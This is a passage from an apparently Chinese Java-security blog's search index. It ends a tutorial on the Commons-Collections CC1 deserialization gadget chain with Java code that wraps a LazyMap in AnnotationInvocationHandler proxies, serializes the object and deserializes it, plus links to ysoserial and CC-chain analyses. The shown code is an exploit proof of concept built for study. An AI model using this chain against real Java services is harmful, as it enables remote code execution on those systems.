class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvocationHandler</span> invocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 代理</span>        <span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> invocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将代理插入到 AnnotationInvocationHandler 中</span>        invocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Serialize</span><span class="token punctuation">(</span>invocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newOutputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> filename<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">newInputStream</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7. 参考链接"></a>7. 参考链接</h2><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.788">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p><p><a href="https://xz.aliyun.com/t/9409#toc-1">CC链 1-7 分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
